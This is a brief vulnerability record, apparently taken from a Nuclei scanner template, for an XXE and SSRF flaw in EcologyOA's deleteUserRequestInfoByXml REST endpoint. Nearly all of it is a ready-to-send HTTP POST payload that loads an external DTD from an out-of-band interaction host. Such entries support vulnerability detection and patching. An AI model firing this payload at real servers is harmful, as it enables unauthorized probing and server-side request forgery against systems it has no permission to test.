# Vulnerability: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
**Classification:** CWE-611,CWE-918
**Source:** Nuclei Template (`ecology-oa-byxml-xxe.yaml`)

## Description
EcologyOA deleteUserRequestInfoByXml interface has XXE

## Vulnerable Code Pattern / Exploit Payload
```http
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
<M><syscode>&send;</syscode></M>
```

